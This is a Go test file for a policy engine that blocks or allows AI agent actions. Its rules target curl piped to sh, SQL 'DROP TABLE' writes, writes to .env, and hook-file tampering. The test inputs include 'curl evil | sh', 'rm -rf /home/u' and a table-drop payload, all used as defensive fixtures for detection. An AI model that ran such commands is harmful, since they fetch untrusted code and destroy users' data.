package pdp

import (
	"context"
	"strings"
	"testing"

	"github.com/safedep/gryph/aarm/model"
	"github.com/safedep/gryph/aarm/shellcmd"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func mustPDP(t *testing.T, yamlBody string) *PDP {
	t.Helper()
	policy, err := ParsePolicy([]byte(yamlBody))
	require.NoError(t, err)
	engine, err := New(policy)
	require.NoError(t, err)
	return engine
}

func TestEvaluate_JoinedCommandLineMatch(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: block-curl-pipe-sh
    action: block
    match:
      action_types: [tool_use]
      command_patterns: ["curl.*\\|.*sh"]
`)
	// Bare command is "bash"; the malicious invocation is in Args. The matcher
	// must see the joined command line.
	action := &model.Action{
		Type: model.ActionToolUse,
		Parameters: model.Parameters{
			Command: "bash",
			Args:    []string{"-c", "curl evil | sh"},
		},
	}
	res, err := engine.Evaluate(context.Background(), action, nil)
	require.NoError(t, err)
	assert.Equal(t, model.DecisionBlock, res.Decision)
}

func TestEvaluate_FullContentMatchBeyondPreview(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: block-secret
    action: block
    match:
      action_types: [file_write]
      content_patterns: ["DROP TABLE"]
`)
	// The persisted preview (Content) is clean; the payload is in ContentFull
	// past the preview boundary. The matcher must inspect ContentFull.
	action := &model.Action{
		Type: model.ActionFileWrite,
		Parameters: model.Parameters{
			Content:     strings.Repeat("a", 200),
			ContentFull: strings.Repeat("a", 5000) + "DROP TABLE users",
		},
	}
	res, err := engine.Evaluate(context.Background(), action, nil)
	require.NoError(t, err)
	assert.Equal(t, model.DecisionBlock, res.Decision)
}

func TestEvaluate_ContentFallsBackToPreview(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: block-secret
    action: block
    match:
      action_types: [file_write]
      content_patterns: ["SECRET"]
`)
	action := &model.Action{
		Type:       model.ActionFileWrite,
		Parameters: model.Parameters{Content: "has SECRET in preview"},
	}
	res, err := engine.Evaluate(context.Background(), action, nil)
	require.NoError(t, err)
	assert.Equal(t, model.DecisionBlock, res.Decision)
}

func TestEvaluate_ActionPhaseInCEL(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: block-pre-only
    action: block
    match:
      action_types: [file_write]
    condition: "action.phase == 'pre'"
`)
	pre := &model.Action{Type: model.ActionFileWrite, Phase: model.PhasePre}
	post := &model.Action{Type: model.ActionFileWrite, Phase: model.PhasePost}

	resPre, err := engine.Evaluate(context.Background(), pre, nil)
	require.NoError(t, err)
	assert.Equal(t, model.DecisionBlock, resPre.Decision)

	resPost, err := engine.Evaluate(context.Background(), post, nil)
	require.NoError(t, err)
	assert.Equal(t, model.DecisionAllow, resPost.Decision)
}

func TestEvaluate_ContentTruncatedInCEL(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: block-truncated
    action: block
    match:
      action_types: [file_write]
    condition: "action.content_truncated == true"
`)
	action := &model.Action{Type: model.ActionFileWrite, ContentTruncated: true}
	res, err := engine.Evaluate(context.Background(), action, nil)
	require.NoError(t, err)
	assert.Equal(t, model.DecisionBlock, res.Decision)
}

func TestEvaluate_ShellFilePatterns(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: protect-env
    action: block
    match:
      action_types: [command_exec]
      file_patterns: ["**/.env"]
`)
	cases := []struct {
		name   string
		action *model.Action
		want   model.Decision
	}{
		{
			name: "parses the command when the action has no analysis",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "rm .env"},
			},
			want: model.DecisionBlock,
		},
		{
			name: "uses the mediator analysis",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "true"},
				Shell: &shellcmd.Analysis{Parsed: true, Targets: []shellcmd.Target{
					{Path: "/work/.env", Access: shellcmd.AccessWrite},
				}},
			},
			want: model.DecisionBlock,
		},
		{
			name: "a read does not match a file pattern",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "cat .env"},
			},
			want: model.DecisionAllow,
		},
		{
			name: "a tree write into the project root does not match a pattern under any directory",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "rsync -a /tmp/stage/ ./"},
			},
			want: model.DecisionAllow,
		},
		{
			name: "a tar extract in the project root does not match",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "tar xzf node_modules.tgz"},
			},
			want: model.DecisionAllow,
		},
		{
			name: "an unzip in the project root does not match",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "unzip -o dist.zip"},
			},
			want: model.DecisionAllow,
		},
		{
			name: "a tree write into a project subdirectory does not match",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "tar xzf release.tgz -C build"},
			},
			want: model.DecisionAllow,
		},
		{
			name: "a tar extract with absolute names does not match",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "tar -xPf a.tar -C /tmp/x"},
			},
			want: model.DecisionAllow,
		},
		{
			name: "a removal of another directory does not match",
			action: &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: "rm -rf build"},
			},
			want: model.DecisionAllow,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := engine.Evaluate(context.Background(), tc.action, nil)
			require.NoError(t, err)
			assert.Equal(t, tc.want, res.Decision)
		})
	}
}

func TestEvaluate_TreeWriteMatchesOnlyTheHoldingDirectory(t *testing.T) {
	engine := mustPDP(t, `
version: "1"
rules:
  - id: protect-hooks
    action: block
    match:
      action_types: [command_exec]
      file_patterns: ["**/.agent/hooks.json", "/home/u/.config/app/**"]
`)
	cases := []struct {
		command string
		want    model.Decision
	}{
		{"tar xzf a.tgz -C .agent", model.DecisionBlock},
		{"cd .agent && unzip -o /tmp/a.zip", model.DecisionBlock},
		{"cp -r /tmp/stage /home/u/.config/app", model.DecisionBlock},
		{"tar xf /tmp/a.tar -C /home/u/.config/app/sub", model.DecisionBlock},
		{"tar xzf a.tgz", model.DecisionAllow},
		{"tar xzf a.tgz -C .agent/sub", model.DecisionAllow},
		{"cp -r dotfiles/nvim /home/u/.config/", model.DecisionAllow},
		{"rsync -a /tmp/stage/ /home/u/", model.DecisionAllow},
		{"rm -rf /home/u", model.DecisionBlock},
		{"rm -rf .agent", model.DecisionBlock},
	}
	for _, tc := range cases {
		t.Run(tc.command, func(t *testing.T) {
			action := &model.Action{
				Type: model.ActionCommandExec, WorkingDir: "/work",
				Parameters: model.Parameters{Command: tc.command},
			}
			res, err := engine.Evaluate(context.Background(), action, nil)
			require.NoError(t, err)
			assert.Equal(t, tc.want, res.Decision)
		})
	}
}

func TestParentPatterns(t *testing.T) {
	cases := []struct {
		pattern string
		want    []string
	}{
		{"**/.cc/settings.json", []string{"**/.cc"}},
		{"/etc/app/**", []string{"/etc/app"}},
		{"/etc/*/app.conf", []string{"/etc/*"}},
		{"**/.env", nil},
		{"/etc/**/app.conf", nil},
		{".env", nil},
	}
	for _, tc := range cases {
		t.Run(tc.pattern, func(t *testing.T) {
			assert.Equal(t, tc.want, parentPatterns([]string{tc.pattern}))
		})
	}
}

func TestContainerPatterns(t *testing.T) {
	cases := []struct {
		pattern string
		want    []string
	}{
		{"**/.cc/settings.json", []string{"**/.cc"}},
		{"/etc/app/*.conf", []string{"/etc/app", "/etc", "/"}},
		{"**/*.pem", nil},
	}
	for _, tc := range cases {
		t.Run(tc.pattern, func(t *testing.T) {
			assert.Equal(t, tc.want, containerPatterns([]string{tc.pattern}))
		})
	}
}
